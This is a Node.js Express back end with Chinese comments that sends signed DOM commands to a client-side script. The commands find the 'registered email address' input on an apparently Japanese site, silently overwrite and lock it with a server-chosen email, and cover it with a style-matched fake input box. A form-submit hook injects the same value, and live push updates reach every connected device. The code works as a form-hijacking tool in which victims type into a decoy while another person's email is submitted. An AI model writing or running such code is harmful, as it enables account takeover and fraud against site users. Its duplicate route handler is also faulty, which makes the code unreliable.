const express = require('express');
const crypto = require('crypto');
const app = express();

// ========== 环境变量（Render只需要配置这个，无邮箱！）==========
const PORT = process.env.PORT || 3000;
const MASTER_KEY = process.env.MASTER_KEY; // 32位随机密钥，前端必须一致
const TIMEOUT = 5 * 60 * 1000; // 签名有效期5分钟
// ==============================================================

// 内存存储（重启会丢，免费版够用；要持久化可接SQLite/Redis）
// key=密钥哈希，value={email, updatedAt}，不存明文密钥
const configStore = new Map();
const hashKey = (k) => crypto.createHash('sha256').update(k).digest('hex');

app.use(express.json());

// ========== 安全工具 ==========
function sign(method, path, ts, body='') {
  return crypto.createHmac('sha256', MASTER_KEY)
    .update(`${method}\n${path}\n${ts}\n${body}`).digest('hex');
}
function auth(req, res, next) {
  const sig = req.headers['x-signature'];
  const ts = parseInt(req.headers['x-timestamp']);
  const body = req.body ? JSON.stringify(req.body) : '';
  if (!sig || !ts) return res.status(401).json({e:'缺鉴权头'});
  if (Math.abs(Date.now()-ts) > TIMEOUT) return res.status(401).json({e:'签名过期'});
  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(sign(req.method,req.path,ts,body))))
    return res.status(401).json({e:'签名无效'});
  // 从签名反查用户配置（用MASTER_KEY哈希当存储键，单用户够用；多用户可改传userKey）
  req.userKey = hashKey(MASTER_KEY);
  next();
}

// ========== 【核心】生成DOM操作指令集（所有逻辑全在后端！）==========
// 前端只认这些指令类型：findInput、setValue、createOverlay、bindEvent、syncSize、formHook
function generateCommands(email) {
  return [
    // 指令1：查找邮箱输入框（原findTargetInput逻辑全转成后端规则）
    {
      id: 'findMail',
      type: 'findInput',
      params: {
        selectors: ['input[type="email"]','input[type="text"]','input'],
        parentText: 'ご登録されたメールアドレス',
        maxDepth: 5
      }
    },
    // 指令2：强制写入邮箱+触发事件
    {
      id: 'setMail',
      type: 'setValue',
      params: {
        target: 'ref:findMail', // 引用上一步找到的元素
        value: email,
        events: ['input','change','blur'],
        lock: true // 被修改时自动回写
      }
    },
    // 指令3：创建覆盖假输入框（原样式逻辑全后端定义）
    {
      id: 'fakeInput',
      type: 'createOverlay',
      params: {
        target: 'ref:findMail',
        styles: {
          position: 'absolute', zIndex: '10', boxSizing: 'border-box',
          margin: '0', outline: 'none', pointerEvents: 'auto'
        },
        copyStyles: ['paddingTop','paddingRight','paddingBottom','paddingLeft',
          'borderWidth','borderStyle','borderColor','borderRadius',
          'fontFamily','fontSize','fontWeight','lineHeight','color','backgroundColor'],
        autocomplete: 'off',
        submitOnEnter: true
      }
    },
    // 指令4：同步尺寸（窗口变化/横竖屏切换）
    {
      id: 'syncSize',
      type: 'syncSize',
      params: { overlay: 'ref:fakeInput', target: 'ref:findMail', debounce: 150 }
    },
    // 指令5：表单提交兜底
    {
      id: 'formHook',
      type: 'formHook',
      params: { target: 'ref:findMail', value: email }
    }
  ];
}

// ========== 业务接口 ==========
app.get('/health', (_,r)=>r.json({ok:1,t:Date.now()}));

// 1. 前端设置自定义邮箱 → 后端保存 → 返回最新指令
app.post('/api/config/set', auth, (req,res)=>{
  const email = req.body?.email?.trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({e:'邮箱格式错'});
  configStore.set(req.userKey, {email, updatedAt: Date.now()});
  res.json({ok:1, commands: generateCommands(email), email});
});

// 2. 拉取当前指令集（页面加载时调用）
app.get('/api/commands', auth, (req,res)=>{
  const cfg = configStore.get(req.userKey);
  if (!cfg?.email) return res.status(410).json({e:'请先设置邮箱'});
  res.json({commands: generateCommands(cfg.email), email: cfg.email});
});

// 3. SSE实时推送：设置新邮箱后所有在线设备即时更新
const sseClients = new Map(); // userKey → [res1,res2...]
app.get('/api/stream', auth, (req,res)=>{
  res.setHeader('Content-Type','text/event-stream');
  res.setHeader('Cache-Control','no-cache');
  res.setHeader('Connection','keep-alive');
  if (!sseClients.has(req.userKey)) sseClients.set(req.userKey,[]);
  sseClients.get(req.userKey).push(res);
  // 先发当前指令
  const cfg = configStore.get(req.userKey);
  if (cfg?.email) res.write(`data:${JSON.stringify({commands:generateCommands(cfg.email),email:cfg.email})}\n\n`);
  req.on('close',()=>{
    const arr = sseClients.get(req.userKey)?.filter(c=>c!==res)||[];
    arr.length ? sseClients.set(req.userKey,arr) : sseClients.delete(req.userKey);
  });
});

// 【内部】保存邮箱后广播给所有在线设备
function broadcastUpdate(userKey, email) {
  sseClients.get(userKey)?.forEach(r=>{
    try{ r.write(`data:${JSON.stringify({commands:generateCommands(email),email})}\n\n`) }catch{}
  });
}
// 重写保存逻辑，加广播
const originalSet = app.post;
app.post('/api/config/set', auth, (req,res,next)=>{
  const email = req.body?.email?.trim();
  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    process.nextTick(()=>broadcastUpdate(req.userKey, email));
  }
  next();
});

// 防休眠自ping
setInterval(()=>require('http').get(`http://localhost:${PORT}/health`).on('error',()=>{}), 14*60*1000);

app.listen(PORT, ()=>console.log(`✅ 后端启动 端口${PORT} | 等待前端设置邮箱`));
